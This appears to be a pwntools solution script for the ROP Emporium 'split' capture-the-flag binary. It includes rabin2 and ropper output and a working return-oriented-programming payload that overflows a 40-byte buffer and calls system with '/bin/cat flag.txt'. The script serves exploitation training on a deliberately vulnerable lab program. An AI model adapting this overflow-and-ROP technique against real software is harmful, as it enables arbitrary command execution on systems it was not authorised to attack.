from pwn import *

'''
rabin2 -z split

0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
------------------------------------------------------------------------
ropper -f split | grep rdi

0x00000000004007c3: pop rdi; ret;
'''

context.binary = elf = ELF('./split')
offset = 40

flag_string = 0x601060
pop_rdi     = 0x4007c3
call_system = 0x40074b

payload = b'c'*offset+p64(pop_rdi)+p64(flag_string)+p64(call_system)



p = elf.process()
p.recv()
p.sendline(payload)
log.info(p.recvall())
